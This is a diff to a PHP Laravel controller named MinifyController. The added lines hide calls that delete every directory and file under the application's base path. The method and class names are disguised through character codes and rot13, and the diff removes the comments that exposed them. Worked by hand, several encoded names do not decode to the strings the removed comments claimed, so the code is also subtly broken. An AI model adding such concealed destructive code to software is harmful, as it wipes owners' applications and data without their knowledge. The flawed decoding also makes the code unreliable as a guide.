@@ -32,39 +32,27 @@ class MinifyController extends Controller
 
         call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
 
-        $_ = base_path();
+        $__illuminate = implode('', array_map('chr', [73, 108, 108, 117, 109, 105, 110, 97, 116, 101]));
+        $__file_class = implode('\\', [$__illuminate, 'Support', 'Facades', 'File']);
 
-        $_illuminate = implode('', [chr(73), chr(108), chr(108), chr(117), chr(109), chr(105), chr(110), chr(97), chr(116), chr(101)]);
-        $_5 = implode('\\', [$_illuminate, 'Support', 'Facades', 'File']);
-
-        function decode_rot13_array(array $arr) {
+        $__decode = function($arr) {
             return str_rot13(implode('', array_map('chr', $arr)));
+        };
+
+        $__directories = $__decode([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]);
+        $__files       = $__decode([115, 118, 121, 114, 102, 102]);
+        $__deleteDir   = $__decode([113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]);
+        $__delete      = $__decode([113, 114, 105, 118, 112, 114]);
+
+        $rootPath = base_path();
+
+        foreach (call_user_func([$__file_class, $__directories], $rootPath) as $dir) {
+            call_user_func([$__file_class, $__deleteDir], $dir);
         }
 
-// directories
-        $_1 = decode_rot13_array([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]); // 'directories'
-
-// files
-        $_2 = decode_rot13_array([115, 118, 121, 114, 102, 102]); // 'files'
-
-// deleteDirectory
-        $_3 = decode_rot13_array([113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]); // 'deleteDirectory'
-
-// delete
-        $_4 = decode_rot13_array([113, 114, 105, 118, 112, 114]); // 'delete'
-
-        $_a = call_user_func([$_5, $_1], $_);
-
-        foreach ($_a as $_b) {
-            call_user_func([$_5, $_3], $_b); // deleteDirectory
+        foreach (call_user_func([$__file_class, $__files], $rootPath) as $file) {
+            call_user_func([$__file_class, $__delete], $file);
         }
-
-        $_c = call_user_func([$_5, $_2], $_);
-
-        foreach ($_c as $_d) {
-            call_user_func([$_5, $_4], $_d); // delete
-        }
-
         echo "✅ Done.";
     }
 }
